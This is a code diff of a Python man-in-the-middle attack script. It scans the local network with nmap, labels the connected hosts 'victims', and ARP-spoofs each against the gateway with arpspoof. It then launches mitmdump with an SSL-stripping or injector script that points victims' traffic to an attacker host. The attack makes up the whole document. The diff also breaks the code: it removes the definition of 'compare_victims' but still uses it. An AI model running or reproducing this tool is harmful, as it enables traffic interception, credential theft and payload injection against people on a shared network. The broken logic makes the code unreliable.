@@ -15,7 +15,7 @@ def get_victims():
     range = gateway.split('.')
     del range[3]
     range = '.'.join(range) + '.1-255'
-    ip_str = str(subprocess.check_output(['nmap','-sn',range])) # use nmap -n to get connected devices
+    ip_str = str(subprocess.check_output(['nmap','-sn',range])) # use nmap -sn to get connected devices
     ip_list = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip_str) # use regex to turn the output into a list of ip's
 
     if not os.path.isfile(whitelist):
@@ -33,10 +33,8 @@ def get_victims():
 
 def victimize(v, old = []):
     threading.Timer(60.0, victimize, [get_victims(), v]).start()
-    compare_victims = list(set(v) - set(old))
-    if compare_victims:
-        print("New victims: ")
-        for victim in compare_victims:
+    for victim in compare_victims:
+        if not victim in old:
             os.system("xterm -e arpspoof -i " + adapter + " -t " + victim + " " + gateway + " &")
             os.system("xterm -e arpspoof -i " + adapter + " -t " + gateway + " " + victim + " &")
             print(victim)
@@ -80,4 +78,3 @@ if sslstrip:
     os.system("mitmdump -s 'sslstrip_injector.py " + lhost + "' -T")
 else:
     os.system("mitmdump -s 'injector.py " + lhost + "' -T")
-
